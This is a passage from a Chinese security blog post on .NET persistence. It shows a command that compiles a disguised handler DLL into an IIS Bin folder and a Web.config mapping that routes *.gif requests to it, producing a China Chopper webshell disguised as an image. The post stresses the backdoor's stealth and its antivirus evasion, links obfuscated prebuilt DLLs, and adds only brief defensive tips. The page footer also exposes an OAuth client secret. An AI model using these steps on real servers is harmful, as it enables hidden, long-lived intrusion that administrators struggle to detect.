+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe /t:library -out:C:\inetpub\wwwroot\Bin\IsapiModu1e.Handler.dll C:\inetpub\wwwroot\IsapiModu1e.Handler.js</span><br></pre></td></tr></table></figure>
+
+<p><img src="../img/net/b7b6775f7a5ac0dd1cd4d8a9df813750.png" alt></p>
+<p><img src="../img/net/38e40fc44d587448f24837ce61583cc5.png" alt></p>
+<p>修改Web.config配置，添加新的DLL映射关系，完成这步整个菜刀后门配置完成。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;system.webServer&gt; &lt;modules runAllManagedModulesForAllRequests=&quot;true&quot;/&gt; &lt;directoryBrowse enabled=&quot;true&quot;/&gt; &lt;staticContent&gt; &lt;mimeMap fileExtension=&quot;.json&quot; mimeType=&quot;application/json&quot; /&gt; &lt;/staticContent&gt; &lt;handlers&gt; &lt;add name=&quot;PageHandlerFactory-ISAPI-2.0-32-1&quot; path=&quot;*.gif&quot; verb=&quot;*&quot; type=&quot;IsapiModu1e.Handler&quot; preCondition=&quot;integratedMode&quot;/&gt; &lt;/handlers&gt; &lt;/system.webServer&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问图片菜刀地址 <a href="http://ip/news.gif" target="_blank" rel="noopener">http://ip/news.gif</a> ，看到下图表示菜刀马运行成功！</p>
+<p><img src="../img/net/80d7867752b9266bb3768553496f4faf.png" alt></p>
+<p>菜刀也毫无压力的连接成功！</p>
+<p><img src="../img/net/29aadfd0a7afe3a898ba8c3523018e0c.png" alt></p>
+<p><img src="../img/net/9fecbc6ebf5c9aa63d86b902721ee595.png" alt></p>
+<p>最后笔者下载了常见的几款查杀工具，不出预料之前探索出来的一句话木马和混淆后的DLL均免杀。</p>
+<h1 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h1><ol>
+<li><p>这样实现的后门非常隐蔽，管理员很难发觉，可以长期权限维持；</p>
+</li>
+<li><p>生成的DLL也可以在本地，或者再进一步可以混淆或者加壳等等对抗服务端杀软；</p>
+</li>
+<li><p>文章的代码片段和DLL下载请参考 <a href="https://github.com/Ivan1ee" target="_blank" rel="noopener">https://github.com/Ivan1ee</a> ；</p>
+</li>
+<li><p>Github上已经有编译好的并且加了混淆的DLL；</p>
+</li>
+<li><p>未加混淆的DLL MD5分别是IsapiModu1e.Handler.dll =&gt; MD5<br>(39cbf41b99a3751b3ff755509e35b1ae)、IsapiModules.Handler.dll =&gt; MD5<br>(e891914d65f28822aaf2d13ae984eee6)</p>
+</li>
+<li><p>加壳混淆后的DLL MD5分别是 IsapiModu1e.Handler.dll =&gt; MD5<br>(8cc5a23e925aa52d0ae80bec8ab28f88) 、IsapiModules.Handler.dll =&gt; MD5<br>(7cbba64946ecbc824c2cca1192b16684)</p>
+</li>
+</ol>
+<h1 id="0x06-防御措施"><a href="#0x06-防御措施" class="headerlink" title="0x06 防御措施"></a>0x06 防御措施</h1><ol>
+<li><p>作为管理员可以通过查看Web.config里的handlers映射关系排查；</p>
+</li>
+<li><p>通过IIS服务器管理程序排查非法的映射关系；</p>
+</li>
+<li><p>对于隐藏的大马或者小马，传统的IDS不好检测，需要终端防护联动起来排杀；</p>
+</li>
+</ol>
+<h1 id="0x07参考链接"><a href="#0x07参考链接" class="headerlink" title="0x07参考链接"></a>0x07参考链接</h1><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/visualstudio/visual-studio-2010/7435xtz6(v=vs.100)" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/previous-versions/visualstudio/visual-studio-2010/7435xtz6(v=vs.100)</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/previous-versions/dotnet/netframework-2.0/bya7fh0a%28v%3dvs.80%29" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/previous-versions/dotnet/netframework-2.0/bya7fh0a%28v%3dvs.80%29</a></p>
+<p>转自：<a href="https://github.com/Ivan1ee/NetDLLSpy" target="_blank" rel="noopener">https://github.com/Ivan1ee/NetDLLSpy</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/02/17/2019-2-17-NET下的权限维持/" title=".net下的权限维持">https://wh0ale.github.io/2019/02/17/2019-2-17-NET下的权限维持/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/权限维持/" rel="tag"><i class="fa fa-tag"></i># 权限维持</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/01/30/2019-1-30-应急响应/" rel="next" title="应急响应">
+                <i class="fa fa-chevron-left"></i> 应急响应
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/02/18/sqli_lab总结/" rel="prev" title="sqli_lab总结">
+                sqli_lab总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-DLL型WebShell后门"><span class="nav-number">2.</span> <span class="nav-text">0x02 DLL型WebShell后门</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-HttpHandler映射"><span class="nav-number">3.</span> <span class="nav-text">0x03 HttpHandler映射</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-菜刀一句话的隐藏"><span class="nav-number">4.</span> <span class="nav-text">0x04 菜刀一句话的隐藏</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-小结"><span class="nav-number">5.</span> <span class="nav-text">0x05 小结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-防御措施"><span class="nav-number">6.</span> <span class="nav-text">0x06 防御措施</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x07参考链接"><span class="nav-number">7.</span> <span class="nav-text">0x07参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
